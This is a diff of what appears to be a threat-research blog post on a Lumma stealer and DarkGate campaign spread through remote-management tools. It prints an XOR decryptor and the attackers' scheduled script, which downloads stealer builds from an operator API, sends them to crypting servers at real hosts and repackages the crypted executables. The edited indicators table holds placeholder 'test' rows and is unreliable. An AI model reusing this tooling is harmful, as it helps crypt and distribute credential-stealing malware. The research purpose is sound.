@@ -441,19 +441,19 @@ Here is the Python script to decrypt the data:
 {% highlight python %}
 
 def decrypt(data, key):
-    value = bytes.fromhex(data)
-    key_length = len(key)
-    encrypted = bytearray()
-    key_alt = key_length
-    
-    for char in key:
-        key_alt = key_alt ^ ord(char)
-    for byte in value:
-        encrypted_byte = ~(byte ^ key_alt) & 0xFF  
-        encrypted.append(encrypted_byte)
-    return encrypted
+    value = bytes.fromhex(data)
+    key_length = len(key)
+    encrypted = bytearray()
+    key_alt = key_length
+    
+    for char in key:
+        key_alt = key_alt ^ ord(char)
+    for byte in value:
+        encrypted_byte = ~(byte ^ key_alt) & 0xFF  
+        encrypted.append(encrypted_byte)
+    return encrypted
   
-enc_data = ""  # Encrypted data
+enc_data = ""  # Encrypted data
 enc_key = "" # XOR key
 dec_data = decrypt(enc_data, enc_key)
 print(f"Decrypted data: {dec_data}")
@@ -506,151 +506,152 @@ import pyzipper
 import schedule
 import time
 
-
 encryption_api_key = "h8dbOGTYLrFLplwiNZ1BLl3MhnpZCmJY"
 encryption_server_address_packlab = "http://194.87.219.118/crypt"
 encryption_server_address_easycrypt = "http://another.server.address/crypt"
 api_url = "https://apilumma1.fun/v1/downloadBuild"
 
-  
 def read_autocrypt_ini(file_path):
-    config = configparser.ConfigParser()
-    temp_config_path = file_path + ".tmp"
-    with open(file_path, 'r') as original_file, open(temp_config_path, 'w') as temp_file:
-        for line in original_file:
-            line = line.split('#')[0].strip()  
-            if line:  
-                temp_file.write(line + '\n')
+    config = configparser.ConfigParser()
+    temp_config_path = file_path + ".tmp"
 
-    config.read(temp_config_path)
-    os.remove(temp_config_path)
+    with open(file_path, 'r') as original_file, open(temp_config_path, 'w') as temp_file:
+        for line in original_file:
+            line = line.split('#')[0].strip()  
+            if line:  
+                temp_file.write(line + '\n')
 
+    config.read(temp_config_path)
+    os.remove(temp_config_path)
 
-    settings = {
-        'auto_crypt': config.getboolean('Settings', 'auto_crypt', fallback=False),
-        'auto_crypt_time': config.getint('Settings', 'auto_crypt_time', fallback=0),
-        'crypt_service': config.get('Settings', 'crypt_service', fallback=''),
-        'lumma_stealer': config.getboolean('Settings', 'lumma_stealer', fallback=False),
-        'lumma_api_key': config.get('Settings', 'lumma_api_key', fallback=''),
-        'lumma_build_zip_password': config.get('Settings', 'lumma_build_zip_password', fallback=''),
-        'filename': config.get('Settings', 'filename', fallback=''),
-        'chatid': config.get('Settings', 'chatid', fallback='')
-    }
-    return settings
-
+    settings = {
+        'auto_crypt': config.getboolean('Settings', 'auto_crypt', fallback=False),
+        'auto_crypt_time': config.getint('Settings', 'auto_crypt_time', fallback=0),
+        'crypt_service': config.get('Settings', 'crypt_service', fallback=''),
+        'lumma_stealer': config.getboolean('Settings', 'lumma_stealer', fallback=False),
+        'lumma_api_key': config.get('Settings', 'lumma_api_key', fallback=''),
+        'lumma_build_zip_password': config.get('Settings', 'lumma_build_zip_password', fallback=''),
+        'filename': config.get('Settings', 'filename', fallback=''),
+        'chatid': config.get('Settings', 'chatid', fallback='')
+    }
+    return settings
 
 def download_and_extract_zip(api_url, api_key, save_path, zip_password, filename):
-    url = f'{api_url}?access_token={api_key}'
-    response = requests.get(url)
-    zip_file_path = os.path.join(save_path, f'{filename}.zip')
-    with open(zip_file_path, 'wb') as f:
-        f.write(response.content)
-    with pyzipper.AESZipFile(zip_file_path, 'r') as zip_ref:
-        zip_ref.extractall(path=save_path, pwd=zip_password.encode('utf-8'))
+    url = f'{api_url}?access_token={api_key}'
+    response = requests.get(url)
+    zip_file_path = os.path.join(save_path, f'{filename}.zip')
 
-    os.remove(zip_file_path)
-    print(f"Downloaded and extracted files to: {save_path}")
+    with open(zip_file_path, 'wb') as f:
+        f.write(response.content)
 
-    # پیدا کردن فایل استخراج شده
-    extracted_file_path = None
-    for file in os.listdir(save_path):
-        if file.endswith('.exe'):
-            extracted_file_path = os.path.join(save_path, file)
-            break
+    with pyzipper.AESZipFile(zip_file_path, 'r') as zip_ref:
+        zip_ref.extractall(path=save_path, pwd=zip_password.encode('utf-8'))
 
-    if not extracted_file_path:
-        raise FileNotFoundError(f"Extracted file not found in: {save_path}")
-    return extracted_file_path
+    os.remove(zip_file_path)
+    print(f"Downloaded and extracted files to: {save_path}")
+    
+    # پیدا کردن فایل استخراج شده
+    extracted_file_path = None
+    for file in os.listdir(save_path):
+        if file.endswith('.exe'):
+            extracted_file_path = os.path.join(save_path, file)
+            break
+
+    if not extracted_file_path:
+        raise FileNotFoundError(f"Extracted file not found in: {save_path}")
+    
+    return extracted_file_path
 
 def encrypt_file(input_path, service):
-    try:
-        with open(input_path, 'rb') as file:
-            files = {'build.exe': file}
-            headers = {'Authorization': encryption_api_key}
-            if service == 'Packlab':
-                response = requests.post(encryption_server_address_packlab, headers=headers, files=files)
-            elif service == 'Easycrypt':
-                response = requests.post(encryption_server_address_easycrypt, headers=headers, files=files)
+    try:
+        with open(input_path, 'rb') as file:
+            files = {'build.exe': file}
+            headers = {'Authorization': encryption_api_key}
+            if service == 'Packlab':
+                response = requests.post(encryption_server_address_packlab, headers=headers, files=files)
+            elif service == 'Easycrypt':
+                response = requests.post(encryption_server_address_easycrypt, headers=headers, files=files)
 
-        if response.status_code == 200:
-            return response.content
-        else:
-            raise Exception(f"Error: {response.status_code}, {response.text}")
-    except requests.exceptions.RequestException as e:
-        raise Exception(f"An error occurred: {e}")
+        if response.status_code == 200:
+            return response.content
+        else:
+            raise Exception(f"Error: {response.status_code}, {response.text}")
+    except requests.exceptions.RequestException as e:
+        raise Exception(f"An error occurred: {e}")
 
 def create_encrypted_zip(file_path, save_path, filename, password):
-    zip_file_path = os.path.join(save_path, f'{filename}.zip')
-    pyminizip.compress(file_path, None, zip_file_path, password, 5)
-    print(f"Encrypted zip file created at: {zip_file_path}")
-
+    zip_file_path = os.path.join(save_path, f'{filename}.zip')
+    pyminizip.compress(file_path, None, zip_file_path, password, 5)
+    print(f"Encrypted zip file created at: {zip_file_path}")
 
 def process_user_folders(root_folder):
-    for user_folder in os.listdir(root_folder):
-        user_folder_path = os.path.join(root_folder, user_folder)
-        if os.path.isdir(user_folder_path):
-            for slot_folder in os.listdir(user_folder_path):
-                slot_folder_path = os.path.join(user_folder_path, slot_folder)
-                if os.path.isdir(slot_folder_path):
-                    ini_file_path = os.path.join(slot_folder_path, 'autocrypt.ini')
-                    if os.path.exists(ini_file_path):
-                        settings = read_autocrypt_ini(ini_file_path)
-                        if not settings['auto_crypt']:
-                            print(f"Skipping {slot_folder_path} because auto_crypt is False")
-                            continue
-                        try:
-                            if settings['lumma_stealer']:
-                                extracted_file_path = download_and_extract_zip(api_url, settings['lumma_api_key'], slot_folder_path, settings['lumma_build_zip_password'], settings['filename'])
-                            else:
-                                raise Exception("Lumma stealer is disabled")
-                        except Exception as e:
-                            print(f"Error with Lumma stealer: {e}")
-                            last_build_folder = os.path.join(slot_folder_path, '__LASTBUILD__')
-                            if os.path.isdir(last_build_folder):
-                                for file in os.listdir(last_build_folder):
-                                    if file.endswith('.exe'):
-                                        extracted_file_path = os.path.join(last_build_folder, file)
-                                        break
-                                else:
-                                    print(f"No executable found in {last_build_folder}")
-                                    continue
-                            else:
-                                print(f"No __LASTBUILD__ folder found in {slot_folder_path}")
-                                continue
+    for user_folder in os.listdir(root_folder):
+        user_folder_path = os.path.join(root_folder, user_folder)
+        if os.path.isdir(user_folder_path):
+            for slot_folder in os.listdir(user_folder_path):
+                slot_folder_path = os.path.join(user_folder_path, slot_folder)
+                if os.path.isdir(slot_folder_path):
+                    ini_file_path = os.path.join(slot_folder_path, 'autocrypt.ini')
+                    if os.path.exists(ini_file_path):
+                        settings = read_autocrypt_ini(ini_file_path)
+                        
+                        if not settings['auto_crypt']:
+                            print(f"Skipping {slot_folder_path} because auto_crypt is False")
+                            continue
 
-                        if settings['crypt_service'] == 'Packlab':
-                            encrypted_file_content = encrypt_file(extracted_file_path, 'Packlab')
-                        elif settings['crypt_service'] == 'Easycrypt':
-                            encrypted_file_content = encrypt_file(extracted_file_path, 'Easycrypt')
-                        else:
-                            print(f"Unknown crypt_service: {settings['crypt_service']}")
-                            continue
+                        try:
+                            if settings['lumma_stealer']:
+                                extracted_file_path = download_and_extract_zip(api_url, settings['lumma_api_key'], slot_folder_path, settings['lumma_build_zip_password'], settings['filename'])
+                            else:
+                                raise Exception("Lumma stealer is disabled")
+                        except Exception as e:
+                            print(f"Error with Lumma stealer: {e}")
+                            last_build_folder = os.path.join(slot_folder_path, '__LASTBUILD__')
+                            if os.path.isdir(last_build_folder):
+                                for file in os.listdir(last_build_folder):
+                                    if file.endswith('.exe'):
+                                        extracted_file_path = os.path.join(last_build_folder, file)
+                                        break
+                                else:
+                                    print(f"No executable found in {last_build_folder}")
+                                    continue
+                            else:
+                                print(f"No __LASTBUILD__ folder found in {slot_folder_path}")
+                                continue
 
-                        # ذخیره فایل رمزنگاری شده
-                        encrypted_file_path = os.path.join(slot_folder_path, f'{settings["filename"]}.exe')
+                        if settings['crypt_service'] == 'Packlab':
+                            encrypted_file_content = encrypt_file(extracted_file_path, 'Packlab')
+                        elif settings['crypt_service'] == 'Easycrypt':
+                            encrypted_file_content = encrypt_file(extracted_file_path, 'Easycrypt')
+                        else:
+                            print(f"Unknown crypt_service: {settings['crypt_service']}")
+                            continue
+                        
+                        # ذخیره فایل رمزنگاری شده
+                        encrypted_file_path = os.path.join(slot_folder_path, f'{settings["filename"]}.exe')
+                        with open(encrypted_file_path, 'wb') as encrypted_file:
+                            encrypted_file.write(encrypted_file_content)
+                        
+                        print(f"Encrypted file saved to: {encrypted_file_path}")
 
-                        with open(encrypted_file_path, 'wb') as encrypted_file:
-                            encrypted_file.write(encrypted_file_content)
-                        print(f"Encrypted file saved to: {encrypted_file_path}")
-                        
-                        # ایجاد فایل زیپ رمزنگاری شده
-                        create_encrypted_zip(encrypted_file_path, slot_folder_path, settings['filename'], settings['chatid'])
+                        # ایجاد فایل زیپ رمزنگاری شده
+                        create_encrypted_zip(encrypted_file_path, slot_folder_path, settings['filename'], settings['chatid'])
 
-  
 def job():
-    input_folder = r'C:\xampp\htdocs\Updates'  # Change this to your input folder path
-    process_user_folders(input_folder)
+    input_folder = r'C:\xampp\htdocs\Updates'  # Change this to your input folder path
+    process_user_folders(input_folder)
 
-  
 if __name__ == "__main__":
-    # اجرای اولیه برنامه
-    job()
-  
-    # زمان‌بندی اجرای هر 3 ساعت یکبار
-    schedule.every(1).hours.do(job)
-    while True:
-        schedule.run_pending()
-        time.sleep(1)
+    # اجرای اولیه برنامه
+    job()
+
+    # زمان‌بندی اجرای هر 3 ساعت یکبار
+    schedule.every(1).hours.do(job)
+    
+    while True:
+        schedule.run_pending()
+        time.sleep(1)
+
 
 {% endhighlight %}
 
@@ -679,32 +680,16 @@ It was interesting to see developers leveraging legitimate Remote Monitoring and
 Blue teamers should monitor for the execution of suspicious AutoIt scripts and process injections targeting **RegAsm.exe**, **msbuild.exe**, **MicrosoftEdgeUpdate.exe**, and **updatecore.exe**, especially when these processes originate from RMM tools as parent processes. Additionally, it's important to examine the log files of RMM tools for any metadata that could suggest malicious activity.
 
 # Indicators of Compromise
-| Name                                                      | Indicator                               |
-| --------------------------------------------------------- | --------------------------------------- |
-| Aunteficator_em_BHdAOse8_installer_Win7-Win11_x86_x64.msi | f740670bd608f6a564366606e0bba8da        |
-| em_Kia5weA1_installer_Win7-Win11_x86_x64.msi              | a295cf96ebabdfa1d30424e72ed6d4df        |
-| em_8azU2ahn_installer_Win7-Win11_x86_x64.msi              | a2b4081e6ac9d7ff9e892494c58d6be1        |
-| Salome.zip                                                | 5b295738eaf3c6aa623e2699f6d79e3a        |
-| script.a3x (Salome.zip)                                   | a504ca75b88e18b18509cb44acb27631        |
-| Core.zip                                                  | 8259de1408aae0f9ddeb85b2f47cfa30        |
-| script.a3x (Core.zip)                                     | 91584a4b3f28029ecdfb9f04e3cc801f        |
-| Rhadamanthys                                              | f227b281d745d53fcb06fe2bf7de7d26        |
-| DarkGate loader                                           | a674a4ac02d85b5b208f17a5b5655c30        |
-| SectopRAT                                                 | c7ab8bb24309bd1e17651614cd8096dd        |
-| Rhadamanthys C2                                           | 95.217.44.124                           |
-| SectopRAT                                                 | 45.141.87.55                            |
-| LummaC2                                                   | quialitsuzoxm[.]shop<br>                |
-| LummaC2                                                   | complaintsipzzx[.]shop<br>              |
-| LummaC2                                                   | mennyudosirso[.]shop                    |
-| LummaC2                                                   | pieddfreedinsu[.]shop                   |
-| LummaC2                                                   | languagedscie[.]shop                    |
-| LummaC2                                                   | bassizcellskz[.]shop                    |
-| Build ID                                                  | GThHyI--DolphinTag                      |
-| updater.py                                                | d01de188808d566745d1ce888b431910        |
-| autocrypt.ini                                             | 0f8f5de30b3560e08fcbfdb8e740748d        |
-| RMM instance URL                                          | richardmilliestpe.itsm-us1.comodo[.]com |
-| RMM instance URL                                          | itstrq.itsm-us1.comodo[.]com            |
 
+| Name  | Indicators                       |
+| ----- | -------------------------------- |
+| test  | test                             |
+| C2    | 147.78.103.197                   |
+| C2    | 45.138.16.167                    |
+| tesrt | d295c4f639d581851aea8fbcc1ea0989 |
+|       |                                  |
+|       |                                  |
+|       |                                  |
 # Reference
 
 [https://unprotect.it/technique/easycrypter/](https://unprotect.it/technique/easycrypter/)
